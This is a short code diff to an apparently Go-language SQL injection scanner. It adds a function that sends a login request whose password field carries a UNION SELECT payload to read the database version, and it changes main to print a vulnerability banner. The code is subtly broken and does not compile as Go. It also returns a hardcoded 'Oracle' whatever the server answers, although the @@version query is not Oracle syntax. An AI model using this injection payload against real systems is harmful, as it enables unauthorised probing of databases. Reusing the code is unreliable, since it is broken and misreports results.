@@ -59,10 +59,23 @@ func check_sqli() bool {
 	return false;
 }
 
+func get_version() {
+	data := url.Values {
+		"username":		{"admin"},
+		"password":		{"test'; UNION SELECT 1,2,@@version;"},
+	};
+	code, body = get_response(data);
+	if (code == 200 && (body != "")) {
+		fmt.println(body);
+	}
+	return "Oracle";
+}
+
 func main() {
 	var vuln bool = check_sqli();
 
 	if (vuln == true) {
-		fmt.Println("Success");
+		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********");
+		var _type string = get_version()
 	}
 }
